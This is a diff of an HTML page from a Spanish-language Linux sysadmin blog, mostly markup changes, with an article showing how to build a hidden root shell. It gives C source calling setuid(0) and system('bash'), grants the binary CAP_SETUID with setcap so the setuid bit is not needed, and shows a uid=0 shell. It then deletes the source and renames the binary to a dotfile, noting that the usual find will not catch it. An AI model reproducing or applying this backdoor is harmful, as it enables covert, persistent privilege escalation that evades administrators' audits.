@@ -146,84 +146,84 @@ Linux Sysadmin            </a>
 <p>El truco esta en las <em>linux capabilities</em>, que nos permiten dar permisos para operaciones concretas a binarios concretos; así pues, no es necesario ejecutar el binario con el usuario <em>root</em>.</p>
 <p>El resto es tan fácil como hacer un binario que escale a <em>root</em> y luego ejecute lo que necesitamos, por ejemplo, una línea de comandos <strong>bash</strong>.</p>
 <p>Aquí ponemos el código fuente necesario para hacer lo que pretendemos.</p>
-<div class="highlight"><pre><span class="o">[</span>gerard@server ~<span class="o">]</span><span class="nv">$ </span>cat root_shell.c
+<div class="highlight"><pre><span></span><span class="o">[</span>gerard@server ~<span class="o">]</span>$ cat root_shell.c
 int main<span class="o">()</span> <span class="o">{</span>
     setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
     system<span class="o">(</span><span class="s2">&quot;bash&quot;</span><span class="o">)</span><span class="p">;</span>
 <span class="o">}</span>
-<span class="o">[</span>gerard@server ~<span class="o">]</span><span class="err">$</span>
+<span class="o">[</span>gerard@server ~<span class="o">]</span>$
 </pre></div>
 
 
 <p>La compilación no tiene ningún misterio; lo compilamos con <strong>gcc</strong> y le pasamos un <strong>strip</strong> para reducir el tamaño al máximo.</p>
-<div class="highlight"><pre><span class="o">[</span>gerard@server ~<span class="o">]</span><span class="nv">$ </span>gcc -o root_shell root_shell.c
-<span class="o">[</span>gerard@server ~<span class="o">]</span><span class="nv">$ </span>strip root_shell
-<span class="o">[</span>gerard@server ~<span class="o">]</span><span class="err">$</span>
+<div class="highlight"><pre><span></span><span class="o">[</span>gerard@server ~<span class="o">]</span>$ gcc -o root_shell root_shell.c
+<span class="o">[</span>gerard@server ~<span class="o">]</span>$ strip root_shell
+<span class="o">[</span>gerard@server ~<span class="o">]</span>$
 </pre></div>
 
 
 <p>Si tratamos de ejecutarlo, veremos que la llamada para escalar a <em>root</em> ha sido ignorada; el usuario que hemos usado no tiene permisos para hacer eso.</p>
-<div class="highlight"><pre><span class="o">[</span>gerard@server ~<span class="o">]</span><span class="nv">$ </span>./root_shell
-<span class="o">[</span>gerard@server ~<span class="o">]</span><span class="nv">$ </span>id
+<div class="highlight"><pre><span></span><span class="o">[</span>gerard@server ~<span class="o">]</span>$ ./root_shell
+<span class="o">[</span>gerard@server ~<span class="o">]</span>$ id
 <span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>gerard<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>gerard<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>gerard<span class="o">)</span>
-<span class="o">[</span>gerard@server ~<span class="o">]</span><span class="nv">$ </span><span class="nb">exit</span>
+<span class="o">[</span>gerard@server ~<span class="o">]</span>$ <span class="nb">exit</span>
 <span class="nb">exit</span>
-<span class="o">[</span>gerard@server ~<span class="o">]</span><span class="err">$</span>
+<span class="o">[</span>gerard@server ~<span class="o">]</span>$
 </pre></div>
 
 
 <p>Vamos a darle la <em>capability</em> <strong>CAP_SETUID</strong>. Además, le pondremos los flags <em>effective</em> y <em>permitted</em>, que darán la <em>capability</em> automáticamente y lo pasará a los procesos hijos. Mas información en <a href="http://linux.die.net/man/7/capabilities">la documentación</a>.</p>
 <p><strong>TRUCO</strong>: he usado <strong>sudo</strong> para hacer esta operación, pero como no tendremos esto en producción, tendremos que esperar una intervención en donde nos concedan ese permiso.</p>
-<div class="highlight"><pre><span class="o">[</span>gerard@server ~<span class="o">]</span><span class="nv">$ </span>sudo setcap cap_setuid+ep root_shell
+<div class="highlight"><pre><span></span><span class="o">[</span>gerard@server ~<span class="o">]</span>$ sudo setcap cap_setuid+ep root_shell
 <span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> gerard:
-<span class="o">[</span>gerard@server ~<span class="o">]</span><span class="err">$</span>
+<span class="o">[</span>gerard@server ~<span class="o">]</span>$
 </pre></div>
 
 
 <p>Ejecutando el binario, vemos que hemos obtenido lo que esperábamos; un binario que nos deja ante una línea de comandos con el usuario <em>root</em>.</p>
-<div class="highlight"><pre><span class="o">[</span>gerard@server ~<span class="o">]</span><span class="nv">$ </span>./root_shell
-<span class="o">[</span>root@server ~<span class="o">]</span><span class="c"># id</span>
+<div class="highlight"><pre><span></span><span class="o">[</span>gerard@server ~<span class="o">]</span>$ ./root_shell
+<span class="o">[</span>root@server ~<span class="o">]</span><span class="c1"># id</span>
 <span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>gerard<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>gerard<span class="o">)</span>
-<span class="o">[</span>root@server ~<span class="o">]</span><span class="c"># exit</span>
+<span class="o">[</span>root@server ~<span class="o">]</span><span class="c1"># exit</span>
 <span class="nb">exit</span>
-<span class="o">[</span>gerard@server ~<span class="o">]</span><span class="err">$</span>
+<span class="o">[</span>gerard@server ~<span class="o">]</span>$
 </pre></div>
 
 
 <p>Podemos ver que no hay permisos especiales tipo <em>setuid</em>, con lo que no pueden encontrarlo con el <strong>find</strong> habitual.</p>
-<div class="highlight"><pre><span class="o">[</span>gerard@server ~<span class="o">]</span><span class="nv">$ </span>ls -lh
+<div class="highlight"><pre><span></span><span class="o">[</span>gerard@server ~<span class="o">]</span>$ ls -lh
 total 12K
 -rwxrwxr-x. <span class="m">1</span> gerard gerard 4.3K Mar <span class="m">31</span> 18:01 root_shell
 -rw-rw-r--. <span class="m">1</span> gerard gerard   <span class="m">50</span> Mar <span class="m">31</span> 17:59 root_shell.c
-<span class="o">[</span>gerard@server ~<span class="o">]</span><span class="err">$</span>
+<span class="o">[</span>gerard@server ~<span class="o">]</span>$
 </pre></div>
 
 
 <p>Vamos a intentar ocultar lo que nos delataría a simple vista; eliminamos el innecesario código fuente y ocultaremos el binario.</p>
-<div class="highlight"><pre><span class="o">[</span>gerard@server ~<span class="o">]</span><span class="nv">$ </span>rm root_shell.c
-<span class="o">[</span>gerard@server ~<span class="o">]</span><span class="nv">$ </span>mv root_shell .hidden
-<span class="o">[</span>gerard@server ~<span class="o">]</span><span class="nv">$ </span>
+<div class="highlight"><pre><span></span><span class="o">[</span>gerard@server ~<span class="o">]</span>$ rm root_shell.c
+<span class="o">[</span>gerard@server ~<span class="o">]</span>$ mv root_shell .hidden
+<span class="o">[</span>gerard@server ~<span class="o">]</span>$ 
 </pre></div>
 
 
 <p>Comprobamos que sigue funcionando, y que tiene la <em>capability</em> que le hemos dado.</p>
-<div class="highlight"><pre><span class="o">[</span>gerard@server ~<span class="o">]</span><span class="nv">$ </span>./.hidden
-<span class="o">[</span>root@server ~<span class="o">]</span><span class="c"># id</span>
+<div class="highlight"><pre><span></span><span class="o">[</span>gerard@server ~<span class="o">]</span>$ ./.hidden
+<span class="o">[</span>root@server ~<span class="o">]</span><span class="c1"># id</span>
 <span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>gerard<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>gerard<span class="o">)</span>
-<span class="o">[</span>root@server ~<span class="o">]</span><span class="c"># exit</span>
+<span class="o">[</span>root@server ~<span class="o">]</span><span class="c1"># exit</span>
 <span class="nb">exit</span>
-<span class="o">[</span>gerard@server ~<span class="o">]</span><span class="nv">$ </span>getpcaps .hidden
+<span class="o">[</span>gerard@server ~<span class="o">]</span>$ getpcaps .hidden
 Capabilities <span class="k">for</span> <span class="sb">`</span>.hidden<span class="err">&#39;</span>: <span class="o">=</span> cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+i
-<span class="o">[</span>gerard@server ~<span class="o">]</span><span class="err">$</span>
+<span class="o">[</span>gerard@server ~<span class="o">]</span>$
 </pre></div>
             </div>
             <!-- /.entry-content -->
 <section class="well" id="related-posts">
     <h4>Posts relacionados:</h4>
     <ul>
-        <li><a href="http://www.linuxsysadmin.tk/2016/04/instalando-ansible-para-gestionar-servidores.html">Instalando ansible para gestionar servidores</a></li>
-        <li><a href="http://www.linuxsysadmin.tk/2016/03/creando-un-entorno-escalable-2.html">Creando un entorno escalable (II)</a></li>
-        <li><a href="http://www.linuxsysadmin.tk/2016/07/instalando-una-maquina-con-archlinux.html">Instalando una máquina con Archlinux</a></li>
+        <li><a href="http://www.linuxsysadmin.tk/2015/12/construyendo-un-raid-10-en-linux.html">Construyendo un RAID 10 en linux</a></li>
+        <li><a href="http://www.linuxsysadmin.tk/2015/11/virtualizando-contenedores-lxc-tras-bridge-interno.html">Virtualizando contenedores LXC tras bridge interno</a></li>
+        <li><a href="http://www.linuxsysadmin.tk/2016/04/compilando-python-desde-cero.html">Compilando python desde cero</a></li>
     </ul>
 </section>
     <hr/>
@@ -630,9 +630,19 @@ Capabilities <span class="k">for</span> <span class="sb">`</span>.hidden<span cl
                             password
                         </a>
                     </li>
+                    <li class="list-group-item tag-4">
+                        <a href="http://www.linuxsysadmin.tk/tag/php.html">
+                            PHP
+                        </a>
+                    </li>
                     <li class="list-group-item tag-3">
                         <a href="http://www.linuxsysadmin.tk/tag/playbook.html">
                             playbook
+                        </a>
+                    </li>
+                    <li class="list-group-item tag-4">
+                        <a href="http://www.linuxsysadmin.tk/tag/plugins.html">
+                            plugins
                         </a>
                     </li>
                     <li class="list-group-item tag-4">
@@ -706,6 +716,11 @@ Capabilities <span class="k">for</span> <span class="sb">`</span>.hidden<span cl
                         </a>
                     </li>
                     <li class="list-group-item tag-4">
+                        <a href="http://www.linuxsysadmin.tk/tag/ruby.html">
+                            ruby
+                        </a>
+                    </li>
+                    <li class="list-group-item tag-4">
                         <a href="http://www.linuxsysadmin.tk/tag/script.html">
                             script
                         </a>
@@ -755,7 +770,7 @@ Capabilities <span class="k">for</span> <span class="sb">`</span>.hidden<span cl
                             ubuntu
                         </a>
                     </li>
-                    <li class="list-group-item tag-4">
+                    <li class="list-group-item tag-3">
                         <a href="http://www.linuxsysadmin.tk/tag/uwsgi.html">
                             uWSGI
                         </a>
